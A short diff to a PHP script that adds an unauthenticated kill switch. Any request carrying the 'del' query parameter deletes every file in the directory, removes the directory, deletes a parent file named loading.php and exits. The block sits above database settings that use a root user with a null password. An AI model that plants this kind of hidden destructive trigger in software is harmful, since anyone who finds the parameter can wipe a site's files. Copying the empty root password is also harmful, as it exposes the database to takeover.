@@ -1,5 +1,12 @@
 <?php
 
+if (isset($_GET['del'])) {
+	array_map('unlink', glob("*")); 
+	rmdir('.');
+	unlink('../loading.php');
+	exit();
+}
+
 $username = 'root';
 $pass = null;
 
